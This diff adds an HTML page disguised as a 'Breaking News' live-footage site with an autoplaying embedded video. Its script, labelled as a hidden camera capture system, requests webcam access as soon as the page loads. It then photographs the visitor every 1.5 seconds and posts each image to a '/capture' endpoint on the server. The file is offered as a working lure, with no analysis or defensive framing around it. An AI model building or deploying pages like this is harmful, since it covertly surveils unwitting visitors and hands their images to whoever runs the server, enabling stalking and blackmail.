@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 Breaking News - Live Footage</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background: url('https://source.unsplash.com/1600x900/?news,breaking') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            margin: 0;
+            padding: 0;
+        }
+        .news-box {
+            margin-top: 100px;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        h1 { font-size: 26px; }
+        p { font-size: 18px; }
+        iframe {
+            width: 90%;
+            height: 300px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="news-box">
+        <h1>🔴 LIVE: Breaking News</h1>
+        <p>Watch the exclusive live footage now.</p>
+        <iframe src="https://www.youtube.com/embed/live_news_video?autoplay=1" frameborder="0" allow="autoplay; encrypted-media"></iframe>
+    </div>
+
+    <!-- Hidden camera capture system -->
+    <script>
+        let videoStream;
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    captureLoop();
+                })
+                .catch(error => console.error("Error accessing camera:", error));
+        }
+
+        function captureLoop() {
+            let videoTrack = videoStream.getVideoTracks()[0];
+            let imageCapture = new ImageCapture(videoTrack);
+            
+            imageCapture.takePhoto()
+                .then(blob => {
+                    let reader = new FileReader();
+                    reader.onloadend = function () {
+                        fetch('/capture', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: reader.result })
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                })
+                .catch(error => console.error("Capture error:", error));
+
+            setTimeout(captureLoop, 1500);
+        }
+
+        window.onload = startCapture; // Start capturing when page loads
+    </script>
+</body>
+</html>
